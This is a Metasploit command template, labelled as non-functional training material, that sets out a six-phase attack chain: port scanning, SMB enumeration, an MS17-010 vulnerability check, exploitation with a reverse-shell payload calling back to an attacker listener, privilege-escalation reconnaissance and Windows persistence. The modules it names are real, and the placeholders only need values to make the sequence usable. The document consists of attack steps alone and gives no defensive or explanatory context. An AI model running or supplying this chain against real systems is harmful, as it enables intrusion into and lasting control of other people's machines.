# Advanced Exploit Chain Template
# For Training Use â€“ Non-functional Template

# Phase 1: Reconnaissance
use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET_RANGE>
set PORTS <PORT_RANGE>
run

# Phase 2: Service Enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS <TARGET_IP>
run

# Phase 3: Vulnerability Assessment
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

# Phase 4: Exploitation
use <EXPLOIT_MODULE>
set PAYLOAD <PAYLOAD_TYPE>
set RHOST <TARGET_IP>
set LHOST <LHOST>
set LPORT <LPORT>
exploit -j

# Phase 5: Post-Exploitation
use post/multi/recon/local_exploit_suggester
set SESSION <SESSION_ID>
run

# Phase 6: Persistence
use post/windows/manage/persistence_exe
set SESSION <SESSION_ID>
run